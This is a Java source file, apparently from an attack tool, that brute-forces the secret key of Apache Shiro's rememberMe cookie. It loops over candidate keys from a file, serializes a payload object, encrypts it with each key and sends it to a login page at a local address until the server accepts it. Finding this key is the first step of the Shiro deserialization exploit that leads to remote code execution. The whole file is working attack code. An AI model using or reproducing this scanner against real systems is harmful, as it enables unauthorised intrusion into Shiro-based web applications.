package core.scan;

import core.payload.ScanKey;
import core.util.Util;

import java.io.File;
import java.util.Scanner;

public class Scan {

    private static final ShiroHttpConnection connection = new ShiroHttpConnection();

    public static void main(String[] args) throws Exception {
        Scanner scanner = new Scanner(new File("src/main/resources/key"));
        String key = "";
        boolean rightKey = true;
        while (scanner.hasNextLine() && rightKey) {
            Util util = new Util();
            ScanKey scanKey = new ScanKey();
            key = scanner.nextLine();
            byte[] serialize = util.serialize(scanKey.getObjectPayload());
            String rememberMe = util.getRememberMe(serialize, key);
            System.out.println("[+] Test key: " + key);
            rightKey = !connection.checkKey("http://127.0.0.1:8000/login.jsp", rememberMe);
        }
        System.err.println("[*] Find Key: " + key);
    }
}
